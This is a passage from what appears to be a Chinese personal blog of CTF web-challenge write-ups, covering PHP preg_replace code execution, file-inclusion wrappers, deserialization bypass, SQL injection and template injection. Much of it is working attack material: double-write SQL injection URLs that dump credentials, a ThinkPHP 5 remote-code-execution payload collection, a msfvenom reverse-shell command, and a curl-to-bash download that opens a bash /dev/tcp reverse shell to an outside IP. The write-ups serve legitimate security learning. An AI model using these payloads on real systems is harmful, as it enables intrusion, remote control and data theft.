<p>来看看第三个if</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123; <span class="comment">//get和post传入的内容不能是flag=flag</span></span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样的话就构成了$flag=’flag’ 真正的flag被覆盖</p>
<p>无法完成后面get传输的flag覆盖，因为flag早已经在post里被覆盖</p>
<p>所以无法利用</p>
<p>PS：这个题目因为第一个if的利用折磨了我很久,感谢各位师傅的耐心指导。</p>
<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>依然是漂亮的前端,让我想打杨大树了。</p>
<p>在/flag.php页面里有个ip</p>
<p><img src="https://i.loli.net/2020/02/23/5uezq1ypTsCkA8w.png" alt></p>
<p>然后手动get post ip参数  没有任何变化</p>
<p>改了一下XFF头 发现ip可控</p>
<p><img src="https://i.loli.net/2020/02/23/FdIUYAKfs7gQklb.png" alt></p>
<p>模板注入  加了个命令执行</p>
<p><img src="https://i.loli.net/2020/02/23/xZ82LkdYW3bogyj.png" alt="https://i.loli.net/2020/02/23/xZ82LkdYW3bogyj.png"></p>
<h1 id="2020-2-23"><a href="#2020-2-23" class="headerlink" title="2020/2/23"></a>2020/2/23</h1><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>打开之后一串代码映入眼帘,我知道,可能我再也碰不到御剑扫描flag的题目了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>和bugku一个题目很像</p>
<p>让?text=php://input 然后post  I have a dream</p>
<p>可以达成第一个if的条件</p>
<p><img src="https://i.loli.net/2020/02/23/qtsmA8U4XfxnEuY.png" alt="https://i.loli.net/2020/02/23/qtsmA8U4XfxnEuY.png"></p>
<p>然后源码里有个提示是 next.php</p>
<p>我们用伪协议读一下</p>
<p>file=php://filter/read=convert.base64-encode/resource=next.php</p>
<p><img src="https://i.loli.net/2020/02/23/1Nj9cFxiRMEJUHW.png" alt></p>
<p>base64解密</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 深入研究preg_replace与代码执行 : <a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">https://xz.aliyun.com/t/2557</a> </p>
<p>就是传入的参数名字变成匹配规则  参数内容变成字符串</p>
<p>我们自己定义规则让函数去匹配phpinfo  就会执行函数</p>
<p>简而言之 就是在preg_replace /e模式下 让他去匹配我们自定义的内容 </p>
<p>就会RCE</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?.*=&#123;$&#123;phpinfo()&#125;&#125;</span><br><span class="line">\S*=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/23/gX53FAZ9Bj4QrzD.png" alt></p>
<p>用文章里的payload 然后调用getFlag函数</p>
<p>?\S*=${getFlag()}&amp;cmd=system(‘cat /flag’);</p>
<p>得到flag</p>
<p><img src="https://i.loli.net/2020/02/23/cJ6tzHClmMvyQrD.png" alt="https://i.loli.net/2020/02/23/cJ6tzHClmMvyQrD.png"></p>
<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>对username进行注入  测试后发现</p>
<p>对union select or from where等关键词进行双写可以绕过过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//c53de338-33a4-4811-8e6b-32b8756f0186.node3.buuoj.cn/check.php?username=admin'+uunionnion+selselectect+1,2,3--+&amp;password=admin</span></span><br></pre></td></tr></table></figure>
<p>不过很显然username可以绕过登录，但是没有什么用</p>
<p><img src="https://i.loli.net/2020/02/23/3juW89ShFIPvwxi.png" alt></p>
<p>接下来注入passowrd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c53de338-33a4-4811-8e6b-32b8756f0186.node3.buuoj.cn/check.php?username=admin&amp;password=111111&apos;+ununionion+sselectelect+1,2,3--+</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/23/tnRo6HYy9UTFpdG.png" alt></p>
<p>看到了2和3回显位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c53de338-33a4-4811-8e6b-32b8756f0186.node3.buuoj.cn/check.php?username=admin&amp;password=111111&apos;+ununionion+sselectelect+1,2,group_concat(schema_name) ffromrom infoorrmation_schema.schemata--+</span><br></pre></td></tr></table></figure>
<p>查询库</p>
<p><img src="https://i.loli.net/2020/02/23/KxldYEvei8Cf2Ot.png" alt></p>
<p>查询表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c53de338-33a4-4811-8e6b-32b8756f0186.node3.buuoj.cn/check.php?username=admin&amp;password=111111&apos;+ununionion+sselectelect+1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()--+</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/23/BbE3V2iPqreH1Tx.png" alt="https://i.loli.net/2020/02/23/BbE3V2iPqreH1Tx.png"></p>
<p>查询b4bsql的列</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//c53de338-33a4-4811-8e6b-32b8756f0186.node3.buuoj.cn/check.php?username=admin&amp;password=111111'+ununionion+sselectelect+1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql'--+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/23/xOQyvj3arTU6AwP.png" alt="https://i.loli.net/2020/02/23/xOQyvj3arTU6AwP.png"></p>
<p>查询内容 password里的or双写</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//c53de338-33a4-4811-8e6b-32b8756f0186.node3.buuoj.cn/check.php?username=admin&amp;password=111111'+ununionion+sselectelect+1,2,group_concat(id,username,passwoorrd) frfromom b4bsql--+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/23/dNrfxzohUJFk1aO.png" alt="https://i.loli.net/2020/02/23/dNrfxzohUJFk1aO.png"></p>
<p>得到flag</p>
<h1 id="2020-2-24"><a href="#2020-2-24" class="headerlink" title="2020/2/24"></a>2020/2/24</h1><h2 id="研究cobaltstrike"><a href="#研究cobaltstrike" class="headerlink" title="研究cobaltstrike"></a>研究cobaltstrike</h2><p>在阿里云和腾讯云均部署了cobaltstrike服务端,发现服务端不能是五位数的端口,并且监听的端口在80的时候才有效，很奇怪。</p>
<p>最后决定不用这个图像化了</p>
<p>改用msf,那速度就像飞一样,简介明了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
<h2 id="2020-7-2"><a href="#2020-7-2" class="headerlink" title="2020/7/2"></a>2020/7/2</h2><p>补充：cs的种种问题 关闭内网防火墙就好了</p>
<h1 id="2020-3-7"><a href="#2020-3-7" class="headerlink" title="2020/3/7"></a>2020/3/7</h1><h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>有两个点需要绕过 </p>
<p>一个是wakeup方法 把对象属性调大</p>
<p>一个是正则匹配的存在 o或c:数字的形式  用 O:+4绕过</p>
<p>然后需要在php里用utf-8编码base64加密 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="keyword">new</span> Demo(<span class="string">"fl4g.php"</span>);</span><br><span class="line">$a=serialize($a);</span><br><span class="line">$a = str_replace(<span class="string">'O:4'</span>, <span class="string">'O:+4'</span>,$a);</span><br><span class="line">$a = str_replace(<span class="string">':1:'</span>, <span class="string">':2:'</span>,$a); </span><br><span class="line"><span class="keyword">echo</span> $a.<span class="string">'    '</span>;</span><br><span class="line"><span class="keyword">echo</span>(base64_encode($a));</span><br></pre></td></tr></table></figure>
<h2 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h2><p>题目</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'hello'</span>];</span><br><span class="line">$page=$_GET[<span class="string">'page'</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr($page, <span class="string">"php://"</span>)) &#123;</span><br><span class="line">    $page=str_replace(<span class="string">"php://"</span>, <span class="string">""</span>, $page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($page);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以接收两个参数 hello和page</p>
<p>hello没有什么限制 如果page出现php://就会把php://换成空</p>
<p>然后包含page</p>
<p>过滤了page伪协议利用</p>
<p>这里利用大小写绕过他的过滤 然后RCE</p>
<p>第一种做法：Php://input</p>
<p><img src="https://i.loli.net/2020/03/07/xYkO1C647fpBQNh.png" alt></p>
<p><img src="https://i.loli.net/2020/03/07/aCTmh5puZNRXSgQ.png" alt></p>
<p>第二种做法：利用data://伪协议</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php 代码?&gt;</span><br><span class="line">data://text/plain;base64, 代码（代码经过base64转码）</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/02/一段时间的学习记录/C:/Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20200307081644252.png" alt="image-20200307081644252"></p>
<p>第三种做法：利用file://协议</p>
<p>这种做法是半自动化的 因为需要知道flag的绝对路径</p>
<p>Php://filter/read=convert.base64-encode/resource=file:///var/www/fl4gisisish3r3.php </p>
<p>第四种做法：  利用page包含hello参数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span> phpinfo();</span><br><span class="line"><span class="comment">//这样也是可以正常运行</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/03/07/rdepiPv2oqNJLz6.png" alt></p>
<p><img src="https://i.loli.net/2020/03/07/Od1jfXPekhsYDi6.png" alt></p>
<p> <img src="https://img-blog.csdnimg.cn/20190929084930181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://./test.zip(可以改成其他拓展名)/test.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phar://  可以查找指定压缩包内的文件，相对路径和绝对路径均可</span><br><span class="line">zip://  用法与phar类似，不过有两点要注意</span><br></pre></td></tr></table></figure>
<h1 id="2020-3-24"><a href="#2020-3-24" class="headerlink" title="2020/3/24"></a>2020/3/24</h1><h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p>在输入框内随便输入</p>
<p><img src="https://i.loli.net/2020/03/24/Q6tTVnB3XFIPLrO.png" alt></p>
<p>页面跳转了</p>
<p><img src="https://i.loli.net/2020/03/24/AlQYpn9tMwxGBaf.png" alt></p>
<p>查看源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--ssssssti &amp; a little trick --&gt; P3&apos;s girlfirend is : zhanglingling&lt;br&gt;&lt;hr&gt;</span><br></pre></td></tr></table></figure>
<p>提示ssti?</p>
<p>直接用工具 命令执行拿到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 tplmap.py  -u <span class="string">"http://d856bfb3-6905-41f0-b21e-804ebc2ed274.node3.buuoj.cn/qaq?name=nihao"</span>  --os-shell</span><br></pre></td></tr></table></figure>
<h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><p>打开首页 看到 <code>Powered by THINKPHP5</code> </p>
<p><img src="https://i.loli.net/2020/03/24/BY8XZiKdpyOF63b.png" alt></p>
<p>tp5 payload集合</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ThinkPHP &lt;= 5.0.13</span></span><br><span class="line">POST /?s=index/index</span><br><span class="line">s=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system</span><br><span class="line">    </span><br><span class="line"><span class="number">5.0</span>.x php版本&gt;=<span class="number">5.4</span></span><br><span class="line"> http:<span class="comment">//120.79.228.110:8810/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=system(%27tac%20/flag%27);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debug</span></span><br><span class="line">POST /</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al</span><br><span class="line"></span><br><span class="line"><span class="comment"># ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captcha</span></span><br><span class="line">POST /?s=xxx HTTP/<span class="number">1.1</span></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</span><br></pre></td></tr></table></figure>
<p>可以RCE</p>
<p><img src="https://i.loli.net/2020/03/24/6thO8gZ5SdnCXfK.png" alt></p>
<p>直接看flag</p>
<p><img src="https://i.loli.net/2020/03/24/cM5n3RJwHrmUN7b.png" alt></p>
<h2 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="[BJDCTF 2nd]duangShell"></a>[BJDCTF 2nd]duangShell</h2><p>给提示说有swp文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//3fc9e212-6ba3-4c95-b364-62624a29e23c.node3.buuoj.cn/.index.php.swp</span></span><br></pre></td></tr></table></figure>
<p>下载下来swp文件</p>
<p>去linux恢复一下</p>
<p>vim -r index.php.swp</p>
<p><img src="/2020/07/02/一段时间的学习记录/C:/Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20200324132020259.png" alt="image-20200324132020259"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"how can i give you source code? .swp?!"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'girl_friend'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"where is P3rh4ps's girl friend ???"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">'girl_friend'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\&gt;|\\\/'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'just girl'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>post girl_friend来命令执行</p>
<p>过滤了很多参数 而且也没有echo 部分执行了也没回显</p>
<p>想到用curl反弹shell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">girl_friend=curl http:<span class="comment">//174.1.91.127/index.php|bash</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php:    bash -i &gt;&amp; /dev/tcp/<span class="number">174.1</span><span class="number">.91</span><span class="number">.127</span>/<span class="number">8888</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vps: nc -lvp <span class="number">8888</span></span><br></pre></td></tr></table></figure>
<p>拿到shell之后 cat /flag</p>
<p>发现是假的</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag</span><br></pre></td></tr></table></figure>
<p>找到了真正的flag</p>
<h2 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h2><p>参考文章：<a href="http://www.freesion.com/article/2367234678/" target="_blank" rel="noopener">http://www.freesion.com/article/2367234678/</a></p>
<p>官方脚本</p>
<p>匹配的时候用16进制</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=||password regexp  <span class="number">0x5e4f</span> <span class="comment">#&amp;username=%5C</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">基础 regexp 盲注</span><br><span class="line"></span><br><span class="line">有一个小 trick 密码是大小写混合的 所以要用 binary(区分大小写)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">// P3rh4ps tql!!!</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://1d8df83e-b3f8-4cab-a964-572a0ad21096.node3.buuoj.cn/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span><span class="params">(string)</span>:</span></span><br><span class="line"></span><br><span class="line">    c=<span class="string">'0x'</span></span><br><span class="line"></span><br><span class="line">    a=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line"></span><br><span class="line">        a+=hex(ord(i))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c+a.replace(<span class="string">'0x'</span>,<span class="string">''</span>) <span class="comment">#替换后面的0x</span></span><br><span class="line"></span><br><span class="line">alphabet = [<span class="string">'!'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span 